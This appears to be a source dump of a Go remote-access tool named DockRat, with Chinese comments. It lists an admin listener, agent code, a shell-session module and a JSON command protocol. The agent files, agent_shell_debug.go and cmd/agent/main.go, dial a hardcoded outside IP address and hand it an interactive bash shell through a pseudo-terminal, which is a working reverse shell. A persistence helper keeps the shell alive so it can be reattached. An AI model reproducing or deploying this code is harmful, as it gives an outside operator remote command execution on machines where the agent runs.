文件：./agent_shell_debug.go
内容：
package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"syscall"

	"github.com/creack/pty"
)

func main() {
	conn, err := net.Dial("tcp", "45.89.233.225:9999")
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	fmt.Println("[*] Connected to admin.")
	cmd := exec.Command("script", "-q", "-c", "bash", "/dev/null")
	cmd.Env = append(os.Environ(), "TERM=xterm-256color")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid:  true,
		Setctty: true,
		Ctty:    0,
	}

	// ✅ 正确启动控制终端
	ptmx, err := pty.Start(cmd)
	if err != nil {
		panic(err)
	}
	defer func() {
		_ = ptmx.Close()
		_ = cmd.Process.Signal(syscall.SIGKILL)
	}()

	// ✅ 双向复制数据
	go io.Copy(ptmx, conn)
	_, _ = io.Copy(conn, ptmx)
}

子文件夹：./cmd
子文件夹：./cmd/admin
文件：./cmd/admin/main.go
内容：
// === /cmd/admin/main.go ===
// === file info ===
// admin 行为：
// 输入每条命令（如 cd /tmp、ls）

// 编码为结构化协议 {"type": "exec", "data": "cd /tmp"}

// 等待结果返回后显示

package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"

	"github.com/Singert/DockRat/core/protocol"
)


func main() {
	ln, err := net.Listen("tcp", ":9999")
	if err != nil {
		panic(err)
	}
	fmt.Println("[*] Waiting for agent...")

	conn, err := ln.Accept()
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	fmt.Println("[*] Agent connected.")

	stdin := bufio.NewScanner(os.Stdin)
	for {
		fmt.Print("Admin> ")
		if !stdin.Scan() {
			break
		}
		line := stdin.Text()
		fmt.Println("[*] Sending command:", line)
		if line == "shell" {
			msg := protocol.NewCommand("")
			data, _ := protocol.EncodeWithNewline(msg)
			conn.Write(data)
			fmt.Println("[*] Switched to interactive shell. Press Ctrl+C to quit.")
			startInteractiveShell(conn)
			fmt.Println("[*] Returned from shell session.")
			continue
		}
		fmt.Println("Unknown command. Try 'shell'.")
	}
}

func startInteractiveShell(conn net.Conn) {
	done := make(chan struct{})
	go func() {
		_, _ = io.Copy(conn, os.Stdin)
		done <- struct{}{}
	}()
	go func() {
		_, _ = io.Copy(os.Stdout, conn)
		done <- struct{}{}
	}()
	<-done
}

子文件夹：./cmd/agent
文件：./cmd/agent/main.go
内容：
// === /cmd/agent/main.go ===
// === file info ===
// agent 行为：
// 启动时运行一个 bash 或 cmd.exe

// 通过 cmd.StdinPipe() 和 cmd.StdoutPipe() 与之交互

// 将每条 admin 发来的命令写入 shell 的标准输入

// 将结果（stdout/stderr）返回给 admin
package main

import (
	"bufio"
	"fmt"
	"net"

	"github.com/Singert/DockRat/core/protocol"
	"github.com/Singert/DockRat/core/shell"
)



// === /cmd/admin/main.go ===

func main() {
	conn, err := net.Dial("tcp", "45.89.233.225:9999")
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	fmt.Println("[*] Connected to admin.")

	// 启动一个持久 shell
	if err := shell.InitPersistentShell("bash"); err != nil {
		panic(err)
	}

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		msg, err := protocol.Decode(scanner.Bytes())
		if err != nil {
			continue
		}
		if msg.Type == "cmd" {
			fmt.Println("[*] Attaching admin to shell...")
			_ = shell.AttachInteractiveSession(conn)
			fmt.Println("[*] Shell detached.")
		}
	}
}


子文件夹：./core
子文件夹：./core/crypto
子文件夹：./core/filetransfer
子文件夹：./core/node
文件：./core/node/node.go
内容：
// core/node/manager.go
// Package node provides the NodeManager struct and its methods for managing nodes.

package node

import (
	"net"
	"sync"
)

type NodeManager struct {
	mu    sync.Mutex
	nodes map[int]net.Conn
	next  int
}

func NewNoddManager() *NodeManager {
	return &NodeManager{
		nodes: make(map[int]net.Conn),
		next:  0,
	}
}

func (nm *NodeManager) AddNode(conn net.Conn) int {
	nm.mu.Lock()
	defer nm.mu.Unlock()

	nodeID := nm.next
	nm.nodes[nodeID] = conn
	nm.next++

	return nodeID
}

func (nm *NodeManager) Get(nodeID int) (net.Conn, bool) {
	nm.mu.Lock()
	defer nm.mu.Unlock()

	conn, ok := nm.nodes[nodeID]
	return conn, ok
}

func (nm *NodeManager) Remove(nodeID int) {
	nm.mu.Lock()
	defer nm.mu.Unlock()
	delete(nm.nodes, nodeID)
}

子文件夹：./core/protocol
文件：./core/protocol/dispatcher.go
内容：
// === core/protocol/protocol.go ===

package protocol

import (
	"bufio"
	"fmt"
	"net"
	"strings"
)

type HandlerFunc func(msg Message) error

type Dispatcher struct {
	handlers map[string]HandlerFunc
}

func NewDispatcher() *Dispatcher {
	return &Dispatcher{
		handlers: make(map[string]HandlerFunc),
	}
}

func (d *Dispatcher) Register(msgType string, handler HandlerFunc) {
	d.handlers[msgType] = handler
}

func (d *Dispatcher) Dispatch(msg Message) error {
	h, ok := d.handlers[msg.Type]
	if !ok {
		return fmt.Errorf("unhandled message type: %s", msg.Type)
	}
	return h(msg)
}

func (d *Dispatcher) Listen(conn net.Conn) error {
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.TrimSpace(line) == "" {
			continue
		}
		msg, err := Decode([]byte(line))
		if err != nil {
			return fmt.Errorf("error decoding message: %v", err)
		}
		if err := d.Dispatch(msg); err != nil {
			return fmt.Errorf("error dispatching message: %v", err)
		}
	}
	return scanner.Err()
}

func (d *Dispatcher) ListenOnce(conn net.Conn) error {
	scanner := bufio.NewScanner(conn)
	if scanner.Scan() {
		msg, err := Decode(scanner.Bytes())
		fmt.Printf("[*] Received message:%+v\n", msg)
		if err != nil {
			return err
		}
		if handler, ok := d.handlers[msg.Type]; ok {
			return handler(msg)
		}
		return fmt.Errorf("unhandled message type: %s", msg.Type)
	}
	return scanner.Err()
}

文件：./core/protocol/protocol.go
内容：
// === core/protocol/protocol.go ===
package protocol

import "encoding/json"


type Message struct {
	Type string `json:"type"` //"cmd | exit"
	Data string `json:"data"`
}

func Encode(msg Message) ([]byte, error) {
	return json.Marshal(msg)
}

func EncodeWithNewline(msg Message) ([]byte, error) {
	data, err := Encode(msg)
	if err != nil {
		return nil, err
	}
	return append(data, '\n'), nil
}

func Decode(data []byte) (Message, error) {
	var msg Message
	err := json.Unmarshal(data, &msg)
	return msg, err
}

func NewCommand(cmd string) Message {
	return Message{
		Type: "cmd",
		Data: cmd,
	}
}
func NewExit() Message {
	return Message{
		Type: "exit",
	}
}

子文件夹：./core/shell
文件：./core/shell/interactive.go
内容：
// === /core/shell/interactive.go ===
package shell

import (
	"fmt"
	"io"
	"os"
	"os/exec"

	"github.com/creack/pty"
)

func StartShellIO(conn io.ReadWriter, shell string) error {
	cmd := exec.Command("bash", "-i")
	cmd.Env = append(os.Environ(), "TERM=xterm-256color")
	// ✅ 设置初始窗口大小：常规 80x24
	ptmx, err := pty.StartWithSize(cmd, &pty.Winsize{
		Rows: 24,
		Cols: 80,
	})
	if err != nil {
		return err
	}
	defer func() {
		_ = ptmx.Close()
		_ = cmd.Process.Kill()
	}()

	fmt.Fprintln(os.Stderr, "[*] Shell session started.")
	go io.Copy(ptmx, conn)     // admin -> shell
	_, _ = io.Copy(conn, ptmx) // shell -> admin
	return nil
}



文件：./core/shell/persistence.go
内容：
// core/shell/persistent.go
package shell

import (
	"fmt"
	"io"
	"sync"
)

var (
	persistentShell     *ShellSession
	persistentShellOnce sync.Once
)

// InitPersistentShell initializes a global shell session
func InitPersistentShell(shellName string) error {
	var err error
	persistentShellOnce.Do(func() {
		persistentShell, err = StartSession(shellName)
	})
	return err
}

// AttachInteractiveSession bridges the current shell to a conn (admin)
func AttachInteractiveSession(conn io.ReadWriter) error {
	if persistentShell == nil || !persistentShell.IsAlive() {
		return fmt.Errorf("no persistent shell running")
	}

	fmt.Fprintln(persistentShell.ptmx, "echo '[*] Attached to shell.'")

	done := make(chan struct{})

	// Admin -> Shell
	go func() {
		_, _ = io.Copy(persistentShell.ptmx, conn)
		done <- struct{}{}
	}()

	// Shell -> Admin
	go func() {
		_, _ = io.Copy(conn, persistentShell.ptmx)
		done <- struct{}{}
	}()

	<-done // 任一方向中断就退出
	return nil
}

// StopPersistentShell cleanly terminates the session
func StopPersistentShell() error {
	if persistentShell != nil {
		return persistentShell.Kill()
	}
	return nil
}

文件：./core/shell/shell.go
内容：
// core/shell/shell.go
package shell

import (
	"bufio"
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"sync"
	"syscall"

	"github.com/creack/pty"
)

type ShellSession struct {
	cmd    *exec.Cmd
	ptmx   *os.File
	reader *bufio.Reader
	mu     sync.Mutex
	shell  string
}

// StartSession 启动一个新的 shell 会话
func StartSession(shell string) (*ShellSession, error) {
	session := &ShellSession{shell: shell}
	err := session.spawn()
	if err != nil {
		return nil, err
	}
	return session, nil
}

// spawn 用于初始化/重启 shell
func (s *ShellSession) spawn() error {
	cmd := exec.Command(s.shell)
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return err
	}
	s.cmd = cmd
	s.ptmx = ptmx
	s.reader = bufio.NewReader(ptmx)
	return nil
}

// Exec 向 shell 发送命令，并读取直到特殊行
func (s *ShellSession) Exec(command string) (string, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if !s.IsAlive() {
		return "", fmt.Errorf("shell is not running")
	}

	tag := "###END###"
	fullCmd := fmt.Sprintf("%s\necho %s\n", command, tag)
	if _, err := s.ptmx.Write([]byte(fullCmd)); err != nil {
		return "", err
	}

	var buf bytes.Buffer
	for {
		line, err := s.reader.ReadString('\n')
		if err != nil {
			break
		}
		if strings.Contains(line, tag) {
			break
		}
		buf.WriteString(line)
	}
	return buf.String(), nil
}

// Kill 优雅关闭 shell
func (s *ShellSession) Kill() error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.ptmx != nil {
		_ = s.ptmx.Close()
	}
	if s.cmd != nil && s.cmd.Process != nil {
		return s.cmd.Process.Kill()
	}
	return nil
}

// IsAlive 判断 shell 是否仍在运行
func (s *ShellSession) IsAlive() bool {
	if s.cmd == nil || s.cmd.Process == nil {
		return false
	}
	// 调用系统 syscall 检查进程是否还活着
	err := s.cmd.Process.Signal(syscall.Signal(0))
	return err == nil
}

// Reset 重启 shell 会话
func (s *ShellSession) Reset() error {
	_ = s.Kill()
	return s.spawn()
}

子文件夹：./core/transport
子文件夹：./core/tunnel
文件：./go.mod
内容：
module github.com/Singert/DockRat

go 1.23.2

require github.com/creack/pty v1.1.24



